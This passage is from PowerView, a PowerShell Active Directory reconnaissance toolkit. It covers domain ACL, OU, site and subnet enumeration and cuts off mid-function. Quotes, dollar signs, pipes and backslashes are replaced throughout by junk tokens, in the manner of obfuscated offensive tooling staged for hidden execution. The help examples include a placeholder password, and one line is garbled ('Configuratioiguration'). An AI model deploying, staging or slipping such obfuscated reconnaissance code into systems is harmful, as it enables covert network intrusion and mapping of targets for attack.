                            # Oj8XIdentityReferenceDN: RaUIdentityReferenceDNOj8X
                            RaUObject = Get-DomainObject @ObjectSearcherArguments

                            if (RaUObject) {
                                RaUIdentityReferenceName = RaUObject.Properties.samaccountname[0]
                                if (RaUObject.Properties.objectclass -match q4gUcomputerq4gU) {
                                    RaUIdentityReferenceClass = q4gUcomputerq4gU
                                }
                                elseif (RaUObject.Properties.objectclass -match q4gUgroupq4gU) {
                                    RaUIdentityReferenceClass = q4gUgroupq4gU
                                }
                                elseif (RaUObject.Properties.objectclass -match q4gUuserq4gU) {
                                    RaUIdentityReferenceClass = q4gUuserq4gU
                                }
                                else {
                                    RaUIdentityReferenceClass = RaUNull
                                }

                                # save so we donq4gUt look up more than once
                                RaUResolvedSIDs[RaU_.SecurityIdentifier.Value] = RaUIdentityReferenceName, RaUIdentityReferenceDomain, RaUIdentityReferenceDN, RaUIdentityReferenceClass

                                RaUInterestingACL = New-Object PSObject
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUObjectDNq4gU RaU_.ObjectDN
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUAceQualifierq4gU RaU_.AceQualifier
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUActiveDirectoryRightsq4gU RaU_.ActiveDirectoryRights
                                if (RaU_.ObjectAceType) {
                                    RaUInterestingACL wZ5t Add-Member NoteProperty q4gUObjectAceTypeq4gU RaU_.ObjectAceType
                                }
                                else {
                                    RaUInterestingACL wZ5t Add-Member NoteProperty q4gUObjectAceTypeq4gU q4gUNoneq4gU
                                }
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUAceFlagsq4gU RaU_.AceFlags
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUAceTypeq4gU RaU_.AceType
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUInheritanceFlagsq4gU RaU_.InheritanceFlags
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUSecurityIdentifierq4gU RaU_.SecurityIdentifier
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceNameq4gU RaUIdentityReferenceName
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceDomainq4gU RaUIdentityReferenceDomain
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceDNq4gU RaUIdentityReferenceDN
                                RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceClassq4gU RaUIdentityReferenceClass
                                RaUInterestingACL
                            }
                        }
                        else {
                            Write-Warning Oj8X[Find-InterestingDomainAcl] Unable to convert SID q4gURaU(RaU_.SecurityIdentifier.Value )q4gU to a distinguishedname with Convert-ADNameOj8X
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {
<#
.SYNOPSIS

Search for all organization units (OUs) or specific OU objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties whencreated,usnchanged,...Oj8X. By default, all OU objects for
the current domain are returned.

.PARAMETER Identity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.

.PARAMETER GPLink

Only return OUs with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainOU

Returns the current OUs in the domain.

.EXAMPLE

Get-DomainOU *admin* -Domain testlab.local

Returns all OUs with Oj8XadminOj8X in their name in the testlab.local domain.

.EXAMPLE

Get-DomainOU -GPLink Oj8XF260B76D-55C8-46C5-BEF1-9016DD98E272Oj8X

Returns all OUs with linked to the specified group policy object.

.EXAMPLE

Oj8X*admin*Oj8X,Oj8X*server*Oj8X wZ5t Get-DomainOU

Search for OUs with the specific names.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainOU -Credential RaUCred

.OUTPUTS

PowerView.OU

Custom PSObject with translated OU property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.OUq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias(q4gUGUIDq4gU)]
        RaUGPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUOUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (RaUOUSearcher) {
            RaUIdentityFilter = q4gUq4gU
            RaUFilter = q4gUq4gU
            RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                if (RaUIdentityInstance -match q4gU^OU=.*q4gU) {
                    RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                    if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                        # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        Write-Verbose Oj8X[Get-DomainOU] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                        RaUOUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not RaUOUSearcher) {
                            Write-Warning Oj8X[Get-DomainOU] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                        }
                    }
                }
                else {
                    try {
                        RaUGuidByteString = (-Join (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object {RaU_.ToString(q4gUXq4gU).PadLeft(2,q4gU0q4gU)})) -Replace q4gU(..)q4gU,q4gUScKjRaU1q4gU
                        RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                    }
                    catch {
                        RaUIdentityFilter += Oj8X(name=RaUIdentityInstance)Oj8X
                    }
                }
            }
            if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
            }

            if (RaUPSBoundParameters[q4gUGPLinkq4gU]) {
                Write-Verbose Oj8X[Get-DomainOU] Searching for OUs with RaUGPLink set in the gpLink propertyOj8X
                RaUFilter += Oj8X(gplink=*RaUGPLink*)Oj8X
            }

            if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                Write-Verbose Oj8X[Get-DomainOU] Using additional LDAP filter: RaULDAPFilterOj8X
                RaUFilter += Oj8XRaULDAPFilterOj8X
            }

            RaUOUSearcher.filter = Oj8X(&(objectCategory=organizationalUnit)RaUFilter)Oj8X
            Write-Verbose Oj8X[Get-DomainOU] Get-DomainOU filter string: RaU(RaUOUSearcher.filter)Oj8X

            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUOUSearcher.FindOne() }
            else { RaUResults = RaUOUSearcher.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaUPSBoundParameters[q4gURawq4gU]) {
                    # return raw result objects
                    RaUOU = RaU_
                }
                else {
                    RaUOU = Convert-LDAPProperty -Properties RaU_.Properties
                }
                RaUOU.PSObject.TypeNames.Insert(0, q4gUPowerView.OUq4gU)
                RaUOU
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainOU] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUOUSearcher.dispose()
        }
    }
}


function Get-DomainSite {
<#
.SYNOPSIS

Search for all sites or specific site objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties whencreated,usnchanged,...Oj8X. By default, all site objects for
the current domain are returned.

.PARAMETER Identity

An site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or
GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER GPLink

Only return sites with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSite

Returns the current sites in the domain.

.EXAMPLE

Get-DomainSite *admin* -Domain testlab.local

Returns all sites with Oj8XadminOj8X in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSite -GPLink Oj8XF260B76D-55C8-46C5-BEF1-9016DD98E272Oj8X

Returns all sites with linked to the specified group policy object.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainSite -Credential RaUCred

.OUTPUTS

PowerView.Site

Custom PSObject with translated site property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.Siteq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias(q4gUGUIDq4gU)]
        RaUGPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gUSearchBasePrefixq4gU = q4gUCN=Sites,CN=Configurationq4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUSiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (RaUSiteSearcher) {
            RaUIdentityFilter = q4gUq4gU
            RaUFilter = q4gUq4gU
            RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                if (RaUIdentityInstance -match q4gU^CN=.*q4gU) {
                    RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                    if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                        # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        Write-Verbose Oj8X[Get-DomainSite] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                        RaUSiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not RaUSiteSearcher) {
                            Write-Warning Oj8X[Get-DomainSite] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                        }
                    }
                }
                else {
                    try {
                        RaUGuidByteString = (-Join (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object {RaU_.ToString(q4gUXq4gU).PadLeft(2,q4gU0q4gU)})) -Replace q4gU(..)q4gU,q4gUScKjRaU1q4gU
                        RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                    }
                    catch {
                        RaUIdentityFilter += Oj8X(name=RaUIdentityInstance)Oj8X
                    }
                }
            }
            if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
            }

            if (RaUPSBoundParameters[q4gUGPLinkq4gU]) {
                Write-Verbose Oj8X[Get-DomainSite] Searching for sites with RaUGPLink set in the gpLink propertyOj8X
                RaUFilter += Oj8X(gplink=*RaUGPLink*)Oj8X
            }

            if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                Write-Verbose Oj8X[Get-DomainSite] Using additional LDAP filter: RaULDAPFilterOj8X
                RaUFilter += Oj8XRaULDAPFilterOj8X
            }

            RaUSiteSearcher.filter = Oj8X(&(objectCategory=site)RaUFilter)Oj8X
            Write-Verbose Oj8X[Get-DomainSite] Get-DomainSite filter string: RaU(RaUSiteSearcher.filter)Oj8X

            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUSiteSearcher.FindAll() }
            else { RaUResults = RaUSiteSearcher.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaUPSBoundParameters[q4gURawq4gU]) {
                    # return raw result objects
                    RaUSite = RaU_
                }
                else {
                    RaUSite = Convert-LDAPProperty -Properties RaU_.Properties
                }
                RaUSite.PSObject.TypeNames.Insert(0, q4gUPowerView.Siteq4gU)
                RaUSite
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainSite] Error disposing of the Results objectOj8X
                }
            }
            RaUSiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {
<#
.SYNOPSIS

Search for all subnets or specific subnets objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties whencreated,usnchanged,...Oj8X. By default, all subnet objects for
the current domain are returned.

.PARAMETER Identity

An subnet name (e.g. q4gU192.168.50.0/24q4gU), DistinguishedName (e.g. q4gUCN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=localq4gU),
or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER SiteName

Only return subnets from the specified SiteName.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSubnet

Returns the current subnets in the domain.

.EXAMPLE

Get-DomainSubnet *admin* -Domain testlab.local

Returns all subnets with Oj8XadminOj8X in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSubnet -GPLink Oj8XF260B76D-55C8-46C5-BEF1-9016DD98E272Oj8X

Returns all subnets with linked to the specified group policy object.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainSubnet -Credential RaUCred

.OUTPUTS

PowerView.Subnet

Custom PSObject with translated subnet property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.Subnetq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUSiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gUSearchBasePrefixq4gU = q4gUCN=Subnets,CN=Sites,CN=Configurationq4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUSubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (RaUSubnetSearcher) {
            RaUIdentityFilter = q4gUq4gU
            RaUFilter = q4gUq4gU
            RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                if (RaUIdentityInstance -match q4gU^CN=.*q4gU) {
                    RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                    if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                        # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        Write-Verbose Oj8X[Get-DomainSubnet] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                        RaUSubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not RaUSubnetSearcher) {
                            Write-Warning Oj8X[Get-DomainSubnet] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                        }
                    }
                }
                else {
                    try {
                        RaUGuidByteString = (-Join (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object {RaU_.ToString(q4gUXq4gU).PadLeft(2,q4gU0q4gU)})) -Replace q4gU(..)q4gU,q4gUScKjRaU1q4gU
                        RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                    }
                    catch {
                        RaUIdentityFilter += Oj8X(name=RaUIdentityInstance)Oj8X
                    }
                }
            }
            if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
            }

            if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                Write-Verbose Oj8X[Get-DomainSubnet] Using additional LDAP filter: RaULDAPFilterOj8X
                RaUFilter += Oj8XRaULDAPFilterOj8X
            }

            RaUSubnetSearcher.filter = Oj8X(&(objectCategory=subnet)RaUFilter)Oj8X
            Write-Verbose Oj8X[Get-DomainSubnet] Get-DomainSubnet filter string: RaU(RaUSubnetSearcher.filter)Oj8X

